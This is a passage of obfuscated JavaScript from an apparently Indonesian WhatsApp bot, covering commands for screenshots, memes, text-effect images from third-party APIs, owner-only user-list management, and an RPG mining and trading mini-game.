                await _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                    'image': _0xca031a,
                    'caption': _0x5804c8(0x56c)
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0xee09b7) {
                _0x358f3b(util[_0x5804c8(0xb27)](_0xee09b7));
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case 'ssweb2': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xd10) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x14b));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0xccf026 = await getBuffer(_0x5804c8(0x53b) + _0x1b04cf + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0x342)]);
            try {
                await _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                    'image': _0xccf026,
                    'caption': _0x5804c8(0x56c)
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0x54eb57) {
                _0x358f3b(util[_0x5804c8(0xb27)](_0x54eb57));
            }
            limitAdd(_0x1b1e88['sender'], limit);
        }
        break;
        case _0x5804c8(0xd67):
        case _0x5804c8(0x3a4): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            let _0x1bc90f = await fetchJson(_0x5804c8(0x72f));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x4996ac = _0x1bc90f[Math[_0x5804c8(0xa2b)](Math['random']() * _0x1bc90f[_0x5804c8(0x977)])];
            _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x4996ac[_0x5804c8(0x201)]
                },
                'caption': _0x5804c8(0x873)
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x4996ac[_0x5804c8(0x7d1)]
                },
                'caption': _0x5804c8(0xcc4)
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case 'darkjokes':
        case _0x5804c8(0x249): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x243b7f = await getBuffer(_0x5804c8(0x8e5) + _0x932571['ZenzKey']);
            try {
                await _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                    'image': _0x243b7f,
                    'caption': _0x5804c8(0x5da)
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0x2a8862) {
                _0x358f3b(util['format'](_0x2a8862));
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case _0x5804c8(0xd55): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x12b06b = await fetchJson(_0x5804c8(0x250) + _0x932571['XznKey']);
            try {
                const _0x4e3f6e = _0x12b06b['media'],
                    _0x46572a = _0x12b06b['caption'];
                await _0x614da8[_0x5804c8(0x51b)](_0x1b1e88[_0x5804c8(0x60f)], _0x4e3f6e, null, '' + _0x46572a, _0x1b1e88);
            } catch (_0xe4de3f) {
                _0x358f3b(util['format'](_0xe4de3f));
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case 'memeindo': {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + 'limit untuk mengecek limit');
            _0x358f3b(mess['wait']);
            let _0x2e464a = await getBuffer('https://api.zahwazein.xyz/randomimage/memeindo?apikey=' + _0x932571[_0x5804c8(0xa28)]);
            try {
                await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                    'image': _0x2e464a,
                    'caption': _0x5804c8(0x5da)
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0x263db7) {
                _0x358f3b(util['format'](_0x263db7));
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case _0x5804c8(0x61b):
        case _0x5804c8(0x19f):
        case _0x5804c8(0xb8a):
        case 'birthdaycake':
        case _0x5804c8(0x6e1):
        case _0x5804c8(0x5cf):
        case _0x5804c8(0x71e):
        case _0x5804c8(0xd42):
        case _0x5804c8(0x77f):
        case _0x5804c8(0x65e):
        case _0x5804c8(0xd1d):
        case _0x5804c8(0x19b):
        case _0x5804c8(0xa6f):
        case 'facebookgold':
        case _0x5804c8(0x803):
        case _0x5804c8(0xba6):
        case _0x5804c8(0xa88):
        case 'galaxybat':
        case _0x5804c8(0xcc5):
        case _0x5804c8(0xd04):
        case _0x5804c8(0xd3e):
        case _0x5804c8(0xb60):
        case 'graffititext':
        case _0x5804c8(0x768):
        case _0x5804c8(0x900):
        case 'greetingcardvideo':
        case 'halloweenbats':
        case _0x5804c8(0x5ce):
        case 'heartflashlight':
        case _0x5804c8(0xcda):
        case _0x5804c8(0x89a):
        case 'instagramgold':
        case _0x5804c8(0x71f):
        case _0x5804c8(0x6f3):
        case _0x5804c8(0x473):
        case 'lovelycute':
        case _0x5804c8(0xc62):
        case 'merrycard':
        case _0x5804c8(0x5c0):
        case _0x5804c8(0xa37):
        case _0x5804c8(0xd5f):
        case _0x5804c8(0xd70):
        case _0x5804c8(0x1f3):
        case _0x5804c8(0x6e8):
        case _0x5804c8(0xbae):
        case _0x5804c8(0x503):
        case _0x5804c8(0x272):
        case _0x5804c8(0x3fa):
        case _0x5804c8(0xccd):
        case _0x5804c8(0x154):
        case _0x5804c8(0x756):
        case _0x5804c8(0x21d):
        case _0x5804c8(0x79d):
        case _0x5804c8(0xc37):
        case _0x5804c8(0x4b1):
        case 'snowontext':
        case _0x5804c8(0xb32):
        case _0x5804c8(0x5c2):
        case _0x5804c8(0x3d0):
        case _0x5804c8(0x296):
        case _0x5804c8(0x339):
        case 'textonglass':
        case 'textsky':
        case 'thundertext':
        case _0x5804c8(0xc8c):
        case _0x5804c8(0xb03):
        case 'viettel':
        case _0x5804c8(0xd88):
        case _0x5804c8(0x4da):
        case _0x5804c8(0x815):
        case _0x5804c8(0x67d):
        case 'writegalaxy':
        case _0x5804c8(0xa3d):
        case _0x5804c8(0x892):
        case 'youtubesilver':
        case _0x5804c8(0xb05): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xa7f));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0xb4bc9a = await getBuffer(_0x5804c8(0xcd9) + _0x453fc1 + '?text=' + q + '&apikey=' + _0x932571[_0x5804c8(0xc67)]);
            try {
                await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                    'image': _0xb4bc9a,
                    'caption': 'Done kak'
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0x55c242) {
                _0x358f3b(_0x5804c8(0x343));
            }
            limitAdd(_0x1b1e88['sender'], limit);
        }
        break;
        case _0x5804c8(0x7ec):
        case _0x5804c8(0xc55):
        case _0x5804c8(0x4f5):
        case _0x5804c8(0x765):
        case _0x5804c8(0x198):
        case _0x5804c8(0xa22):
        case _0x5804c8(0xb96):
        case _0x5804c8(0x21b):
        case 'fiction':
        case _0x5804c8(0x38d):
        case _0x5804c8(0x3c8):
        case _0x5804c8(0x8a4):
        case 'thunder':
        case _0x5804c8(0x894):
        case '3dstone':
        case _0x5804c8(0x8a0):
        case _0x5804c8(0x32e):
        case 'harry_potter':
        case _0x5804c8(0x780):
        case _0x5804c8(0x643):
        case _0x5804c8(0x573):
        case _0x5804c8(0x7d5):
        case _0x5804c8(0x750):
        case _0x5804c8(0x634):
        case _0x5804c8(0x5cd):
        case _0x5804c8(0x4a7):
        case _0x5804c8(0xb30):
        case _0x5804c8(0x7db):
        case _0x5804c8(0xc59):
        case 'christmas':
        case _0x5804c8(0x2e8):
        case 'snow':
        case _0x5804c8(0x914):
        case 'luxury2':
        case 'gradient2':
        case _0x5804c8(0xc09):
        case _0x5804c8(0x57e):
        case _0x5804c8(0x821):
        case _0x5804c8(0xb26):
        case _0x5804c8(0x9e3):
        case 'metaldark':
        case 'neonlight':
        case _0x5804c8(0x769):
        case _0x5804c8(0x4e1):
        case _0x5804c8(0x59c):
        case 'purple':
        case _0x5804c8(0x3f2):
        case 'deluxe2':
        case _0x5804c8(0x627):
        case _0x5804c8(0x980):
        case _0x5804c8(0xc00):
        case _0x5804c8(0x28b):
        case _0x5804c8(0xce2):
        case _0x5804c8(0xbb2):
        case _0x5804c8(0x554):
        case _0x5804c8(0xba1):
        case _0x5804c8(0xa1d):
        case _0x5804c8(0x38a):
        case _0x5804c8(0xa03):
        case 'natural':
        case _0x5804c8(0x2a2):
        case 'skeleton':
        case _0x5804c8(0xb9f):
        case _0x5804c8(0x853):
        case _0x5804c8(0xc94):
        case _0x5804c8(0x559):
        case _0x5804c8(0xd49):
        case 'balloon6':
        case _0x5804c8(0x4ba):
        case _0x5804c8(0x41a):
        case _0x5804c8(0x943):
        case _0x5804c8(0x78c):
        case _0x5804c8(0x790):
        case _0x5804c8(0x8fc):
        case _0x5804c8(0x30c):
        case 'rock':
        case _0x5804c8(0x59f):
        case 'glass2':
        case _0x5804c8(0x917):
        case _0x5804c8(0xc69):
        case _0x5804c8(0x820):
        case _0x5804c8(0x961):
        case 'glass7':
        case _0x5804c8(0x665):
        case _0x5804c8(0x15d):
        case _0x5804c8(0x2ee):
        case _0x5804c8(0xb18):
        case 'toxic':
        case 'sparkling':
        case _0x5804c8(0x7e7):
        case _0x5804c8(0x766):
        case _0x5804c8(0xa96):
        case _0x5804c8(0x93f):
        case _0x5804c8(0x2ab):
        case _0x5804c8(0xbd3):
        case _0x5804c8(0xaea):
        case _0x5804c8(0x351):
        case 'strawberry':
        case _0x5804c8(0x274):
        case _0x5804c8(0x2a0):
        case 'matrix':
        case 'blood2':
        case 'neonligth2':
        case _0x5804c8(0x2ae):
        case _0x5804c8(0x988):
        case _0x5804c8(0xd15):
        case _0x5804c8(0xd12):
        case _0x5804c8(0xb17):
        case 'gneon':
        case _0x5804c8(0x55c):
        case _0x5804c8(0x543):
        case 'wall':
        case _0x5804c8(0x7b2):
        case 'honey':
        case _0x5804c8(0xbef):
        case _0x5804c8(0x41e):
        case _0x5804c8(0x44a):
        case _0x5804c8(0xd7d):
        case _0x5804c8(0x8f9):
        case 'rusty':
        case _0x5804c8(0x1aa):
        case _0x5804c8(0xd39):
        case 'wood':
        case _0x5804c8(0x5d7):
        case _0x5804c8(0xc5c):
        case _0x5804c8(0x26b):
        case _0x5804c8(0x474):
        case 'jewelry':
        case 'jewelry2':
        case _0x5804c8(0x8b7):
        case 'jewelry4':
        case _0x5804c8(0x550):
        case _0x5804c8(0x418):
        case _0x5804c8(0x211):
        case _0x5804c8(0x1b7):
        case _0x5804c8(0x236):
        case 'golden':
        case _0x5804c8(0x61f):
        case _0x5804c8(0xc4c):
        case 'glitter3':
        case _0x5804c8(0xaa7):
        case _0x5804c8(0x1de):
        case _0x5804c8(0x913):
        case _0x5804c8(0x25f):
        case 'metale':
        case _0x5804c8(0x23c):
        case 'candy':
        case _0x5804c8(0xcd1):
        case _0x5804c8(0x64e):
        case _0x5804c8(0x7bd):
        case _0x5804c8(0x1d4):
        case _0x5804c8(0xcc2): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + ' *text*');
            _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x2a9ea1 = await getBuffer('https://api.zeeoneofc.my.id/api/textpro/' + _0x453fc1 + '?text=' + q + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0xc67)]);
            try {
                await _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                    'image': _0x2a9ea1,
                    'caption': _0x5804c8(0x3b7)
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0x101825) {
                _0x358f3b(mess[_0x5804c8(0x5d2)][_0x5804c8(0x344)]);
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case _0x5804c8(0xb99): {
            if (!_0x7b6ab6) return _0x358f3b(mess['OnlyOwner']);
            if (!_0x1b04cf) return _0x358f3b('Gunakan dengan cara ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xb9c));
            let _0x3803ab = _0x1b1e88[_0x5804c8(0x583)][0x0] ? _0x1b1e88['mentionedJid'][0x0] : _0x1b1e88[_0x5804c8(0x6a4)] ? _0x1b1e88[_0x5804c8(0x6a4)][_0x5804c8(0xd13)] : _0x1b04cf[_0x5804c8(0xa72)](/[^0-9]/g, '') + '@s.whatsapp.net';
            _0x3803ab ? (_0x374470[_0x5804c8(0x453)](_0x3803ab), fs[_0x5804c8(0x933)](_0x5804c8(0xbee), JSON['stringify'](_0x932571, null, 0x2)), _0x358f3b(_0x5804c8(0x366))) : _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xb9c));
        }
        break;
        case _0x5804c8(0x77a): {
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x167));
            let _0xd62037 = _0x1b1e88[_0x5804c8(0x583)][0x0] ? _0x1b1e88[_0x5804c8(0x583)][0x0] : _0x1b1e88[_0x5804c8(0x6a4)] ? _0x1b1e88[_0x5804c8(0x6a4)][_0x5804c8(0xd13)] : _0x1b04cf[_0x5804c8(0xa72)](/[^0-9]/g, '') + _0x5804c8(0x7cd);
            if (_0xd62037) {
                if (!_0x374470['includes'](_0xd62037)) return _0x358f3b(_0x5804c8(0x720));
                _0x374470[_0x5804c8(0x217)](_0x374470[_0x5804c8(0x7a8)](_0xd62037, 0x1)), _0x358f3b('Sukses');
            } else _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xb9c));
        }
        break;
        case _0x5804c8(0x361):
        case 'me':
        case _0x5804c8(0x2d5):
        case _0x5804c8(0x737):
        case _0x5804c8(0x25d): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x53a93f) return _0x358f3b(_0x5804c8(0x372));
            let _0x1a1761 = _0x5804c8(0xb0a);
            _0x1a1761 += '*❤️ Blood* : ' + (getDarah(_0x1b1e88[_0x5804c8(0xd13)]) ? getDarah(_0x1b1e88[_0x5804c8(0xd13)]) : 0x0) + '\x0a', _0x1a1761 += _0x5804c8(0x5db) + (getBesi(_0x1b1e88[_0x5804c8(0xd13)]) ? getBesi(_0x1b1e88[_0x5804c8(0xd13)]) : 0x0) + '\x0a', _0x1a1761 += _0x5804c8(0xa8f) + (getEmas(_0x1b1e88[_0x5804c8(0xd13)]) ? getEmas(_0x1b1e88[_0x5804c8(0xd13)]) : 0x0) + '\x0a', _0x1a1761 += '*🐲 Emerald* : ' + (getEmerald(_0x1b1e88[_0x5804c8(0xd13)]) ? getEmerald(_0x1b1e88['sender']) : 0x0) + '\x0a', _0x1a1761 += _0x5804c8(0x15e) + (getDm(_0x1b1e88[_0x5804c8(0xd13)]) ? getDm(_0x1b1e88['sender']) : 0x0) + '\x0a', _0x1a1761 += _0x5804c8(0xabd) + (_0x7b6ab6 ? _0x5804c8(0x770) : _0x75f0ff ? _0x5804c8(0x770) : getLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit)) + '\x0a', _0x1a1761 += _0x5804c8(0x21a) + (getBalance(_0x1b1e88['sender'], balance) ? getBalance(_0x1b1e88[_0x5804c8(0xd13)], balance) : 0x0) + '\x0a', _0x1a1761 += _0x5804c8(0x54f) + (getPotion(_0x1b1e88['sender']) ? getPotion(_0x1b1e88[_0x5804c8(0xd13)]) : 0x0) + '\x0a\x0a', _0x1a1761 += '*HUNT RESULT*\x0a', _0x1a1761 += _0x5804c8(0xbfd) + util[_0x5804c8(0xb27)](getIkan(_0x1b1e88['sender']) ? getIkan(_0x1b1e88[_0x5804c8(0xd13)]) : 0x0 + getMancingIkan(_0x1b1e88['sender']) ? getMancingIkan(_0x1b1e88[_0x5804c8(0xd13)]) : 0x0) + '\x0a', _0x1a1761 += '*🐔 Chicken* : ' + (getAyam(_0x1b1e88[_0x5804c8(0xd13)]) ? getAyam(_0x1b1e88['sender']) : 0x0) + '\x0a', _0x1a1761 += _0x5804c8(0xc14) + (getKelinci(_0x1b1e88['sender']) ? getKelinci(_0x1b1e88['sender']) : 0x0) + '\x0a', _0x1a1761 += _0x5804c8(0x594) + (getDomba(_0x1b1e88[_0x5804c8(0xd13)]) ? getDomba(_0x1b1e88[_0x5804c8(0xd13)]) : 0x0) + '\x0a', _0x1a1761 += _0x5804c8(0xd29) + (getSapi(_0x1b1e88[_0x5804c8(0xd13)]) ? getSapi(_0x1b1e88[_0x5804c8(0xd13)]) : 0x0) + '\x0a', _0x1a1761 += '*🐘 Elephant* : ' + (getGajah(_0x1b1e88[_0x5804c8(0xd13)]) ? getGajah(_0x1b1e88[_0x5804c8(0xd13)]) : 0x0) + '\x0a', _0x1a1761 += _0x5804c8(0x28e) + (getMiningcoal(_0x1b1e88[_0x5804c8(0xd13)]) ? getMiningcoal(_0x1b1e88[_0x5804c8(0xd13)]) : 0x0) + '\x0a', _0x1a1761 += '🛑 *Stone* : ' + (getMiningstone(_0x1b1e88[_0x5804c8(0xd13)]) ? getMiningstone(_0x1b1e88[_0x5804c8(0xd13)]) : 0x0) + '\x0a', _0x1a1761 += _0x5804c8(0xaff) + (getMiningore(_0x1b1e88['sender']) ? getMiningore(_0x1b1e88[_0x5804c8(0xd13)]) : 0x0) + '\x0a', _0x1a1761 += _0x5804c8(0x24e) + (getMiningingot(_0x1b1e88[_0x5804c8(0xd13)]) ? getMiningingot(_0x1b1e88[_0x5804c8(0xd13)]) : 0x0) + '\x0a', _0x1a1761 += _0x5804c8(0x222) + (getNebangKayu(_0x1b1e88[_0x5804c8(0xd13)]) ? getNebangKayu(_0x1b1e88[_0x5804c8(0xd13)]) : 0x0) + '\x0a', await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x1a1761,
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x358b6e,
                        'body': '',
                        'thumbnailUrl': 'https://telegra.ph/file/eb026b67d45e17632a131.jpg',
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x51e31f
            });
        }
        break;
        case _0x5804c8(0x77b):
        case _0x5804c8(0x4bc): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x53a93f) return _0x358f3b(_0x5804c8(0x372));
            if (_0x25893f < 0x1) return _0x358f3b(_0x5804c8(0x5bf));
            let _0x5417af = [0x1, 0x2, 0x5, 0x0, 0x3, 0x0, 0x1, 0x1, 0x4, 0x1, 0x5, 0x0, 0x0],
                _0x3eb276 = [0x0, 0x1, 0x2, 0x3, 0x0, 0x0, 0x0, 0x1, 0x1, 0x0, 0x0, 0x2],
                _0x5f1ccd = [0x0, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x2, 0x1, 0x0, 0x0, 0x1];
            var _0x4a9ab3 = _0x5417af[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x5417af[_0x5804c8(0x977)])],
                _0x24ce62 = _0x3eb276[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x3eb276[_0x5804c8(0x977)])],
                _0x4aa9c9 = _0x5f1ccd[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x5f1ccd[_0x5804c8(0x977)])];
            setTimeout(async () => {
                const _0x1bf2ef = _0x5804c8;
                let _0x22d6bf = _0x1bf2ef(0xaf3) + _0x4a9ab3 + _0x1bf2ef(0x97f) + _0x24ce62 + _0x1bf2ef(0xbbc) + _0x4aa9c9;
                await _0x614da8[_0x1bf2ef(0x938)](_0x1b1e88[_0x1bf2ef(0x60f)], {
                    'image': {
                        'url': 'https://telegra.ph/file/d17479f0a56cc52826101.jpg'
                    },
                    'caption': _0x22d6bf
                }, {
                    'quoted': _0x1b1e88
                });
            }, 0x1b58), setTimeout(async () => {
                const _0x5aabf7 = _0x5804c8;
                await _0x614da8[_0x5aabf7(0x2a4)](_0x1b1e88[_0x5aabf7(0x60f)], '@' + _0x1b1e88['sender']['split']('@')[0x0] + _0x5aabf7(0xa29), _0x1b1e88);
            }, 0x5dc), kurangDarah(_0x1b1e88['sender'], 0xa), addBesi(_0x1b1e88[_0x5804c8(0xd13)], _0x4a9ab3), addEmas(_0x1b1e88['sender'], _0x24ce62), addEmerald(_0x1b1e88['sender'], _0x4aa9c9);
        }
        break;
        case 'beli':
        case _0x5804c8(0x556): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x53a93f) return _0x358f3b(_0x5804c8(0x372));
            if (!_0x1b04cf) return _0x358f3b('Mau buy apa lu?\x0a\x0a1.potion\x0a2.baitfood\x0a3.limit\x0a\x0aExample: ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x8ff));
            var _0x2e288c = _0x83eae5[0x1];
            if (_0x83eae5[0x0] === _0x5804c8(0xb20)) {
                let _0x4f78d3 = 0x186a0 * _0x2e288c;
                if (!_0x83eae5[0x1]) return _0x358f3b('Example : ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x308));
                if (_0x56b113 < _0x4f78d3) return _0x358f3b(_0x5804c8(0x43c));
                kurangMonay(_0x1b1e88[_0x5804c8(0xd13)], _0x4f78d3);
                var _0x364220 = _0x2e288c * 0x1;
                addPotion(_0x1b1e88['sender'], _0x364220), setTimeout(async () => {
                    const _0x4809c3 = _0x5804c8;
                    _0x358f3b(_0x4809c3(0x4c2) + getMonay(_0x1b1e88[_0x4809c3(0xd13)]) + '\x0a*Potion* : ' + getPotion(_0x1b1e88[_0x4809c3(0xd13)]));
                }, 0x7d0);
            } else {
                if (_0x83eae5[0x0] === _0x5804c8(0x3b8)) {
                    let _0x450dec = 0x1388 * _0x2e288c;
                    if (!_0x83eae5[0x1]) return _0x358f3b(_0x5804c8(0x995) + (_0x3b7c58 + _0x453fc1) + ' baitfood 2\x0a 1 Bait Food = 2500 Money');
                    if (_0x56b113 < _0x450dec) return _0x358f3b('Sisa Uang Anda Tidak Cukup Untuk Pembelian Ini');
                    kurangMonay(_0x1b1e88[_0x5804c8(0xd13)], _0x450dec);
                    var _0x364220 = _0x2e288c * 0x1;
                    addUmpan(_0x1b1e88['sender'], _0x364220), setTimeout(async () => {
                        const _0x138f3d = _0x5804c8;
                        _0x358f3b(_0x138f3d(0x4c2) + getMonay(_0x1b1e88[_0x138f3d(0xd13)]) + '\x0a*Bait Food* : ' + getUmpan(_0x1b1e88[_0x138f3d(0xd13)]));
                    }, 0x7d0);
                } else {
                    if (_0x83eae5[0x0] === _0x5804c8(0x544)) {
                        let _0x26233d = 0x88b8 * _0x2e288c;
                        if (!_0x83eae5[0x1]) return _0x358f3b('Example : ' + (_0x3b7c58 + _0x453fc1) + ' limit 2\x0a 1 Limit = 35000 Money');
                        if (_0x56b113 < _0x26233d) return _0x358f3b('Sisa Uang Anda Tidak Cukup Untuk Pembelian Ini');
                        kurangMonay(_0x1b1e88['sender'], _0x26233d);
                        var _0x364220 = _0x2e288c * 0x1;
                        addLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x364220), setTimeout(async () => {
                            const _0x1cb60 = _0x5804c8;
                            _0x358f3b(_0x1cb60(0x4c2) + getMonay(_0x1b1e88[_0x1cb60(0xd13)]) + '\x0a*Limit* : ' + getLimit(_0x1b1e88['sender']));
                        }, 0x7d0);
                    } else _0x358f3b(_0x5804c8(0x907) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x8ff));
                }
            }
        }
        break;
        case _0x5804c8(0x437):
        case 'sel':
        case _0x5804c8(0x449): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x53a93f) return _0x358f3b(_0x5804c8(0x372));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xd37) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xc97));
            var _0x2e288c = _0x83eae5[0x1];
            if (_0x83eae5[0x0] === _0x5804c8(0x2d9)) {
                if (_0x4dddca < _0x2e288c) return _0x358f3b(_0x5804c8(0x897));
                if (!_0x83eae5[0x1]) return _0x358f3b(_0x5804c8(0x995) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xcfb));
                kurangIkan(_0x1b1e88[_0x5804c8(0xd13)], _0x2e288c);
                let _0x3a1b1f = 0x5dc * _0x2e288c;
                addMonay(_0x1b1e88['sender'], _0x3a1b1f), setTimeout(async () => {
                    const _0x238d0a = _0x5804c8;
                    _0x358f3b(_0x238d0a(0x4c2) + getMonay(_0x1b1e88['sender']) + _0x238d0a(0xb34) + getIkan(_0x1b1e88[_0x238d0a(0xd13)]));
                }, 0x7d0);
            } else {
                if (_0x83eae5[0x0] === 'chicken') {
                    if (_0x41cd7e < _0x2e288c) return _0x358f3b(_0x5804c8(0x1a7));
                    if (!_0x83eae5[0x1]) return _0x358f3b(_0x5804c8(0x995) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x41d));
                    kurangAyam(_0x1b1e88[_0x5804c8(0xd13)], _0x2e288c);
                    let _0x33b8bd = 0x9c4 * _0x2e288c;
                    addMonay(_0x1b1e88['sender'], _0x33b8bd), setTimeout(async () => {
                        const _0x16d7e9 = _0x5804c8;
                        _0x358f3b(_0x16d7e9(0x4c2) + getMonay(_0x1b1e88[_0x16d7e9(0xd13)]) + _0x16d7e9(0x352) + getAyam(_0x1b1e88['sender']));
                    }, 0x7d0);
                } else {
                    if (_0x83eae5[0x0] === _0x5804c8(0x454)) {
                        if (_0x424e7e < _0x2e288c) return _0x358f3b('Anda Tidak Memiliki Cukup Kelinci Untuk Transaksi Ini');
                        if (!_0x83eae5[0x1]) return _0x358f3b(_0x5804c8(0x995) + (_0x3b7c58 + _0x453fc1) + ' rabbit 2\x0a 1 Rabbit = 3000 Money');
                        kurangKelinci(_0x1b1e88['sender'], _0x2e288c);
                        let _0x21eb6d = 0xbb8 * _0x2e288c;
                        addMonay(_0x1b1e88[_0x5804c8(0xd13)], _0x21eb6d), setTimeout(async () => {
                            const _0x143a4e = _0x5804c8;
                            _0x358f3b(_0x143a4e(0x4c2) + getMonay(_0x1b1e88[_0x143a4e(0xd13)]) + _0x143a4e(0x992) + getKelinci(_0x1b1e88['sender']));
                        }, 0x7d0);
                    } else {
                        if (_0x83eae5[0x0] === _0x5804c8(0x1e8)) {
                            if (_0x29294f < _0x2e288c) return _0x358f3b(_0x5804c8(0xbd2));
                            if (!_0x83eae5[0x1]) return _0x358f3b(_0x5804c8(0x995) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xa9a));
                            kurangDomba(_0x1b1e88[_0x5804c8(0xd13)], _0x2e288c);
                            let _0x5f5106 = 0x1388 * _0x2e288c;
                            addMonay(_0x1b1e88['sender'], _0x5f5106), setTimeout(async () => {
                                const _0x6de78d = _0x5804c8;
                                _0x358f3b(_0x6de78d(0x4c2) + getMonay(_0x1b1e88['sender']) + '\x0a*Sisa domba* : ' + getDomba(_0x1b1e88[_0x6de78d(0xd13)]));
                            }, 0x7d0);
                        } else {
                            if (_0x83eae5[0x0] === _0x5804c8(0xbc6)) {
                                if (_0x4bd207 < _0x2e288c) return _0x358f3b(_0x5804c8(0x732));
                                if (!_0x83eae5[0x1]) return _0x358f3b('Example : ' + (_0x3b7c58 + _0x453fc1) + ' cow 2\x0a 1 Cow = 10000 Money');
